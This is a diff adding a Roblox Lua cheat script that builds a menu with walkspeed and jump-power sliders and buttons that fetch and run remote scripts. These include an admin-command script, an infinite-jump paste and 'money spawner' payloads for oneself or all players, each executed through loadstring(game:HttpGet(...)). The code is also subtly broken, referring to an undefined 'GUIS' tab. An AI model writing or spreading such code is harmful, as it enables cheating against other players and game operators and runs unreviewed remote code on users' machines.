@@ -1,0 +1,72 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("SpezZs", "BloodTheme")
+    -- MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main")
+
+    MainSection:NewButton("Infinite Yield", "FE Admin Commands", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end)
+
+    MainSection:NewButton("INFjump", "gives u infinte jumps", function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/iZXaVYi8'),true))()
+    end)
+
+    --LOCAL PLAYER
+    local Player = Window:NewTab("Player")
+    local PlayerSection = Player:NewSection("Player")
+
+    PlayerSection:NewSlider("Walkspeed", "SPEED!!", 500, 16, function(s)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+    end)
+
+    PlayerSection:NewSlider("Jumppower", "JUMP HIGH!!", 350, 50, function(s)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+    end)
+
+    PlayerSection:NewButton("Reset WS/JP", "Resets to all defaults", function()
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    end)
+
+
+  
+    --GUI'S
+    local MoneySpawner = Window:NewTab("GUIS")
+    local MoneySpawners = GUIS:NewSection("MoneySelf")
+    local MoneySpawnera = GUIS:NewSection("MoneyAll")
+
+    MoneySpawners:NewButton("1kSELF", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/sel1Kme'),true))()
+    end)
+
+    MoneySpawners:NewButton("10kSELF", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/sel10Kme'),true))()
+    end)
+
+    MoneySpawners:NewButton("100kSELF", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/sel100Kme'),true))()
+    end)
+
+    MoneySpawners:NewButton("1mSELF", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/sel1Mme'),true))()
+    end)
+    
+    MoneySpawnera:NewButton("1kALL", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/eededs1Kev'),true))()
+    end)
+    
+    MoneySpawnera:NewButton("10kALL", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/eededs10Kev'),true))()
+    end)
+
+    MoneySpawnera:NewButton("100kALL", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/eededs100Kev'),true))()
+    end)
+
+    MoneySpawnera:NewButton("1mALL", "Spawn the amount", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/modderongxmes/eededs/main/eededs1Mev'),true))()
+    end)
+
+
+
